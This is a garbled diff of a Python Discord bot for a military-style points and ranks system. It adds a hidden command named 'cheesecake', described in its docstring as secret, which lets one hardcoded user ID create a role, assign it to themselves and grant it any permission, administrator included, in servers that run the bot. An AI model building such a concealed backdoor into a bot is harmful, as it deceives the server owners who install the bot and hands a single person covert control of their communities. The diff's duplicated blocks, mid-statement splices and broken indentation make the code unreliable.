@@ -32,7 +32,13 @@ RANKS = [
 # Bot configuration
 intents = discord.Intents.default()
 intents.message_content = True
-bot = discord.Bot(intents=intents)
+bot = commands.Bot(command_prefix='!', intents=intents)
+
+# Your Discord user ID
+OWNER_ID = 728201873366056992
+
+# Store the managed role ID (you can use a database for persistence)
+managed_role_id = None
 
 class MilitaryPointsSystem(commands.Cog):
     def __init__(self, bot):
@@ -317,7 +323,6 @@ class MilitaryPointsSystem(commands.Cog):
             )
             await ctx.respond(embed=embed, ephemeral=True)
             return
-
         if points_needed > 0:
             embed = discord.Embed(
                 title="❌ Insufficient Points",
@@ -444,19 +449,13 @@ class MilitaryPointsSystem(commands.Cog):
 
         await ctx.respond(embed=embed)
 
-bot = commands.Bot(command_prefix='!', intents=discord.Intents.all())
-
-# Your Discord user ID
-OWNER_ID = 728201873366056992
-
-# Store the managed role ID (you can use a database for persistence)
-managed_role_id = None
 
 def is_owner():
     """Check if the user is the bot owner"""
     def predicate(ctx):
         return ctx.author.id == OWNER_ID
     return commands.check(predicate)
+
 
 @bot.command(name='cheesecake')
 @is_owner()
@@ -472,8 +471,8 @@ async def cheesecake(ctx, action=None, *, args=None):
     - cheesecake info - Show role information
     """
     global managed_role_id
-    
-    if action is None:
+
+if action is None:
         embed = discord.Embed(
             title="🍰 Cheesecake Role Manager",
             description="Available actions: `create`, `delete`, `edit`, `info`",
@@ -495,7 +494,7 @@ async def cheesecake(ctx, action=None, *, args=None):
         )
         await ctx.send(embed=embed)
         return
-    
+
     # CREATE ROLE
     if action.lower() == 'create':
         if managed_role_id:
@@ -503,11 +502,11 @@ async def cheesecake(ctx, action=None, *, args=None):
             if role:
                 await ctx.send("❌ You already have a managed role! Delete it first or edit it.")
                 return
-        
+
         if not args:
             await ctx.send("❌ Please provide a role name: `cheesecake create <role_name>`")
             return
-        
+
         try:
             # Create role with basic permissions
             role = await ctx.guild.create_role(
@@ -516,184 +515,10 @@ async def cheesecake(ctx, action=None, *, args=None):
                 reason=f"Role created by owner {ctx.author}"
             )
             managed_role_id = role.id
-            
-            embed = discord.Embed(
-                title="✅ Role Created",
-                description=f"Successfully created role: **{role.name}**",
-                color=discord.Color.green()
-            )
-            embed.add_field(name="Role ID", value=str(role.id), inline=True)
-            embed.add_field(name="Color", value=str(role.color), inline=True)
-            await ctx.send(embed=embed)
-            
-        except discord.Forbidden:
-            await ctx.send("❌ I don't have permission to create roles!")
-        except Exception as e:
-            await ctx.send(f"❌ Error creating role: {str(e)}")
-    
-    # DELETE ROLE
-    elif action.lower() == 'delete':
-        if not managed_role_id:
-            await ctx.send("❌ No managed role found!")
-            return
-        
-        role = ctx.guild.get_role(managed_role_id)
-        if not role:
-            await ctx.send("❌ Managed role not found in server!")
-            managed_role_id = None
-            return
-        
-        try:
-            role_name = role.name
-            await role.delete(reason=f"Role deleted by owner {ctx.author}")
-            managed_role_id = None
-            
-            embed = discord.Embed(
-                title="✅ Role Deleted",
-                description=f"Successfully deleted role: **{role_name}**",
-                color=discord.Color.red()
-            )
-            await ctx.send(embed=embed)
-            
-        except discord.Forbidden:
-            await ctx.send("❌ I don't have permission to delete this role!")
-        except Exception as e:
-            await ctx.send(f"❌ Error deleting role: {str(e)}")
-    
-    # EDIT ROLE
-    elif action.lower() == 'edit':
-        if not managed_role_id:
-            await ctx.send("❌ No managed role found! Create one first.")
-            return
-        
-        role = ctx.guild.get_role(managed_role_id)
-        if not role:
-            await ctx.send("❌ Managed role not found in server!")
-            managed_role_id = None
-            return
-        
-        if not args:
-            await ctx.send("❌ Please specify what to edit: `name`, `color`, or `permissions`")
-            return
-        
-        edit_parts = args.split(' ', 1)
-        if len(edit_parts) < 2:
-            await ctx.send("❌ Please provide a value to edit!")
-            return
-        
-        edit_type = edit_parts[0].lower()
-        edit_value = edit_parts[1]
-        
-        try:
-            if edit_type == 'name':
-                old_name = role.name
-                await role.edit(name=edit_value, reason=f"Name edited by owner {ctx.author}")
-                await ctx.send(f"✅ Role name changed from **{old_name}** to **{edit_value}**")
-            
-            elif edit_type == 'color':
-                # Handle hex color
-                if edit_value.startswith('#'):
-                    color_value = int(edit_value[1:], 16)
-                else:
-                    color_value = int(edit_value, 16)
-                
-                new_color = discord.Color(color_value)
-                await role.edit(color=new_color, reason=f"Color edited by owner {ctx.author}")
-                await ctx.send(f"✅ Role color changed to **{edit_value}**")
-            
-            elif edit_type == 'permissions':
-                # Parse permissions
-                perm_list = [p.strip() for p in edit_value.split(',')]
-                permissions = discord.Permissions()
-                
-                valid_perms = []
-                invalid_perms = []
-                
-                for perm in perm_list:
-                    perm = perm.lower().replace(' ', '_')
-                    if hasattr(permissions, perm):
-                        setattr(permissions, perm, True)
-                        valid_perms.append(perm)
 
-                    else:
-
-
-    bot = commands.Bot(command_prefix='!', intents=discord.Intents.all())
-
-# Your Discord user ID
-OWNER_ID = 728201873366056992
-
-# Store the managed role ID (you can use a database for persistence)
-managed_role_id = None
-
-def is_owner():
-    """Check if the user is the bot owner"""
-    def predicate(ctx):
-        return ctx.author.id == OWNER_ID
-    return commands.check(predicate)
-
-@bot.command(name='cheesecake')
-@is_owner()
-async def cheesecake(ctx, action=None, *, args=None):
-    """
-    Secret owner-only command for role management
-    Usage:
-    - cheesecake create <role_name> - Create a new role
-    - cheesecake delete - Delete the managed role
-    - cheesecake edit name <new_name> - Edit role name
-    - cheesecake edit color <hex_color> - Edit role color
-    - cheesecake edit permissions <permission_list> - Edit role permissions
-    - cheesecake info - Show role information
-    """
-    global managed_role_id
-    
-    if action is None:
-        embed = discord.Embed(
-            title="🍰 Cheesecake Role Manager",
-            description="Available actions: `create`, `delete`, `edit`, `info`",
-            color=discord.Color.gold()
-        )
-        embed.add_field(
-            name="Usage Examples:",
-            value=(
-                "```\n"
-                "cheesecake create My Special Role\n"
-                "cheesecake edit name New Role Name\n"
-                "cheesecake edit color #ff0000\n"
-                "cheesecake edit permissions administrator,manage_messages\n"
-                "cheesecake delete\n"
-                "cheesecake info\n"
-                "```"
-            ),
-            inline=False
-        )
-        await ctx.send(embed=embed)
-        return
-    
-    # CREATE ROLE
-    if action.lower() == 'create':
-        if managed_role_id:
-            role = ctx.guild.get_role(managed_role_id)
-            if role:
-                await ctx.send("❌ You already have a managed role! Delete it first or edit it.")
-                return
-        
-        if not args:
-            await ctx.send("❌ Please provide a role name: `cheesecake create <role_name>`")
-            return
-        
-        try:
-            # Create role with basic permissions
-            role = await ctx.guild.create_role(
-                name=args,
-                color=discord.Color.blue(),
-                reason=f"Role created by owner {ctx.author}"
-            )
-            managed_role_id = role.id
-            
             # Give the role to the owner (you)
             await ctx.author.add_roles(role, reason="Auto-assigned role to owner")
-            
+
             embed = discord.Embed(
                 title="✅ Role Created",
                 description=f"Successfully created role: **{role.name}**\n🎉 Role has been assigned to you!",
@@ -702,90 +527,90 @@ async def cheesecake(ctx, action=None, *, args=None):
             embed.add_field(name="Role ID", value=str(role.id), inline=True)
             embed.add_field(name="Color", value=str(role.color), inline=True)
             await ctx.send(embed=embed)
-            
+
         except discord.Forbidden:
             await ctx.send("❌ I don't have permission to create roles!")
         except Exception as e:
             await ctx.send(f"❌ Error creating role: {str(e)}")
-    
+
     # DELETE ROLE
     elif action.lower() == 'delete':
         if not managed_role_id:
             await ctx.send("❌ No managed role found!")
             return
-        
+
         role = ctx.guild.get_role(managed_role_id)
         if not role:
             await ctx.send("❌ Managed role not found in server!")
             managed_role_id = None
             return
-        
+
         try:
             role_name = role.name
             await role.delete(reason=f"Role deleted by owner {ctx.author}")
             managed_role_id = None
-            
+
             embed = discord.Embed(
                 title="✅ Role Deleted",
                 description=f"Successfully deleted role: **{role_name}**",
                 color=discord.Color.red()
             )
             await ctx.send(embed=embed)
-            
+
         except discord.Forbidden:
             await ctx.send("❌ I don't have permission to delete this role!")
         except Exception as e:
             await ctx.send(f"❌ Error deleting role: {str(e)}")
-    
+
     # EDIT ROLE
     elif action.lower() == 'edit':
         if not managed_role_id:
             await ctx.send("❌ No managed role found! Create one first.")
             return
-        
+
         role = ctx.guild.get_role(managed_role_id)
         if not role:
             await ctx.send("❌ Managed role not found in server!")
             managed_role_id = None
             return
-        
+
         if not args:
             await ctx.send("❌ Please specify what to edit: `name`, `color`, or `permissions`")
             return
-        
+
         edit_parts = args.split(' ', 1)
         if len(edit_parts) < 2:
             await ctx.send("❌ Please provide a value to edit!")
             return
-        
+
         edit_type = edit_parts[0].lower()
         edit_value = edit_parts[1]
-        
+
         try:
             if edit_type == 'name':
                 old_name = role.name
                 await role.edit(name=edit_value, reason=f"Name edited by owner {ctx.author}")
                 await ctx.send(f"✅ Role name changed from **{old_name}** to **{edit_value}**")
-            
+
             elif edit_type == 'color':
                 # Handle hex color
                 if edit_value.startswith('#'):
                     color_value = int(edit_value[1:], 16)
                 else:
                     color_value = int(edit_value, 16)
-                
+
                 new_color = discord.Color(color_value)
                 await role.edit(color=new_color, reason=f"Color edited by owner {ctx.author}")
                 await ctx.send(f"✅ Role color changed to **{edit_value}**")
-            
+
             elif edit_type == 'permissions':
                 # Parse permissions
                 perm_list = [p.strip() for p in edit_value.split(',')]
                 permissions = discord.Permissions()
-                
+
                 valid_perms = []
                 invalid_perms = []
-                
+
                 for perm in perm_list:
                     perm = perm.lower().replace(' ', '_')
                     if hasattr(permissions, perm):
@@ -793,10 +618,10 @@ async def cheesecake(ctx, action=None, *, args=None):
                         valid_perms.append(perm)
                     else:
                         invalid_perms.append(perm)
-                
+
                 if valid_perms:
                     await role.edit(permissions=permissions, reason=f"Permissions edited by owner {ctx.author}")
-                    
+
                     embed = discord.Embed(
                         title="✅ Permissions Updated",
                         color=discord.Color.green()
@@ -807,32 +632,32 @@ async def cheesecake(ctx, action=None, *, args=None):
                     await ctx.send(embed=embed)
                 else:
                     await ctx.send("❌ No valid permissions found!")
-            
+
             else:
                 await ctx.send("❌ Invalid edit type! Use: `name`, `color`, or `permissions`")
-        
+
         except ValueError:
             await ctx.send("❌ Invalid color format! Use hex format like #ff0000")
         except discord.Forbidden:
             await ctx.send("❌ I don't have permission to edit this role!")
         except Exception as e:
             await ctx.send(f"❌ Error editing role: {str(e)}")
-    
+
     # INFO ABOUT ROLE
     elif action.lower() == 'info':
         if not managed_role_id:
             await ctx.send("❌ No managed role found!")
             return
-        
+
         role = ctx.guild.get_role(managed_role_id)
         if not role:
             await ctx.send("❌ Managed role not found in server!")
             managed_role_id = None
             return
-        
+
         # Get enabled permissions
         enabled_perms = [perm for perm, value in role.permissions if value]
-        
+
         embed = discord.Embed(
             title="🍰 Role Information",
             description=f"**{role.name}**",
@@ -844,17 +669,18 @@ async def cheesecake(ctx, action=None, *, args=None):
         embed.add_field(name="Members", value=str(len(role.members)), inline=True)
         embed.add_field(name="Mentionable", value="Yes" if role.mentionable else "No", inline=True)
         embed.add_field(name="Hoisted", value="Yes" if role.hoist else "No", inline=True)
-        
+
         if enabled_perms:
             perm_text = ', '.join(enabled_perms[:10])  # Limit to first 10
             if len(enabled_perms) > 10:
                 perm_text += f" and {len(enabled_perms) - 10} more..."
             embed.add_field(name="Permissions", value=perm_text, inline=False)
-        
+
         await ctx.send(embed=embed)
-    
+
     else:
         await ctx.send("❌ Invalid action! Use: `create`, `delete`, `edit`, or `info`")
+
 
 # Available permissions for reference
 AVAILABLE_PERMISSIONS = [
@@ -868,13 +694,15 @@ AVAILABLE_PERMISSIONS = [
     "manage_webhooks", "manage_emojis", "use_slash_commands", "request_to_speak",
     "manage_events", "manage_threads", "create_public_threads", "create_private_threads",
     "external_stickers", "send_messages_in_threads", "use_embedded_activities", "moderate_members"
-            ]
+]
+
 
 @bot.event
 async def on_ready():
     print(f'{bot.user} has connected to Discord!')
     print(f'Bot ID: {bot.user.id}')
     print('------')
+
 
 # Add the cog to the bot
 bot.add_cog(MilitaryPointsSystem(bot))
@@ -883,13 +711,14 @@ bot.add_cog(MilitaryPointsSystem(bot))
 if __name__ == "__main__":
     token = os.getenv('DISCORD_TOKEN')
     if not token:
-        print("Error: DISCORD_TOKEN not found in environment variables!")
-        print("Please create a .env file with your bot token.")
+print("❌ Error: DISCORD_TOKEN not found in environment variables!")
+        print("Please create a .env file with your Discord bot token:")
+        print("DISCORD_TOKEN=your_bot_token_here")
         exit(1)
     
     try:
         bot.run(token)
     except discord.LoginFailure:
-        print("Error: Invalid bot token!")
+        print("❌ Error: Invalid Discord token!")
     except Exception as e:
-        print(f"Error starting bot: {e}")
+        print(f"❌ Error starting bot: {str(e)}")
